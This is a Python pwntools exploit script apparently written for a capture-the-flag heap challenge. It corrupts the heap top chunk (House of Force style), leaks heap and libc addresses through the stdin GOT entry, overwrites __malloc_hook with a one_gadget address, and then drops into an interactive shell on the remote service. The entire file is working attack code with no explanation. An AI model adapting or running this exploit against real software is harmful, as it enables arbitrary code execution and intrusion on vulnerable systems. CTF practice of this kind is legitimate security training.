from pwn import *

context.arch='amd64'

import sys
if len(sys.argv) == 2:
    if sys.argv[1] == 'local':
        host = '127.0.0.1'
        port = 8888
    if sys.argv[1] == 'csie':
        host = 'csie.ctf.tw'
        port = 10141
else:
    print('Please tell me a server\'s name')
    sys.exit()

r = remote(host, port)

def allocate_heap(size, data, sendline=True, top=0, top_size=0):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    if sendline:
        r.sendline(data)
    else:
        r.send(data)
    if top != 0:
        change = 0x10 + (size&0xfffffffffffffff0)
        return top + change, top_size - change

def show_heap():
    r.recvuntil(':')
    r.sendline(b'2')

def gen_new_top(new_top, data, old_top, old_top_size):
    nb = new_top - old_top - 0x10
    allocate_heap(nb, data)
    # print predicted
    new_top = old_top + (nb + 0x10)
    new_top_size = old_top_size - (nb + 0x10) % 0x10000000000000000
    return new_top, new_top_size

def overwrite_chunk_size():
    allocate_heap(0x18, b'c'*0x18 + p64(0xffffffffffffffff))
    r.recvuntil(':')

# leak top position
allocate_heap(0xc8, b'a'*0xc8 + p64(0xf31))
r.recvuntil(':')
allocate_heap(0x1000, b'a')
allocate_heap(0x100, b'a'*0x10, False)
show_heap()
r.recvuntil('a'*0x10)
heap = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
# print('heap =', hex(heap))
top = heap + (0x11d0010 - 0x11ae0d0)
print('top =', hex(top))

glibc_stdin_got = 0x602030
glibc_stdin_off = 0x3c4861
__malloc_hook_off = (0x7f4355058b10 - 0x7f4354c9407f)
one_gadget_off = 0x45216
one_gadget_off = 0x4526a

# leak libc
allocate_heap(0xe00-0x10, b'a')
overwrite_chunk_size()
top = top + 0x20
gen_new_top(glibc_stdin_got - 0x10, b'a', top, 0xfffffffffffffff8)
allocate_heap(0x10, b'a', False)
show_heap()
glibc_stdin = u64(r.recvuntil('\n')[1:-1].ljust(8, b'\x00'))
glibc_stdin = (glibc_stdin & 0xffffffffffffff00) + 0xe0
libc = glibc_stdin - glibc_stdin_off
__malloc_hook = libc + __malloc_hook_off
one_gadget = libc + one_gadget_off - 0x7f
print('__malloc_hook =', hex(__malloc_hook))
print('one_gadget    =', hex(one_gadget))

# change __malloc_hook to one_gadget
allocate_heap(0x38, b'c'*0x38 + p64(0xffffffffffffffff))
r.recvuntil(':')
gen_new_top(__malloc_hook-0x10, b'a', glibc_stdin_got+0x10+0x30+0x10, 0xfffffffffffffff8)
# allocate_heap(0x10, p64(0x4006f9))
allocate_heap(0x18, p64(one_gadget) + p64(0x0) + p64(0x0000000100000000) + p64(0), False)

# allocate_heap(0x10, b'a')
# r.recvuntil(':')
# r.sendline(b'1')
# r.recvuntil(':')
# r.sendline(b'96')

r.interactive()
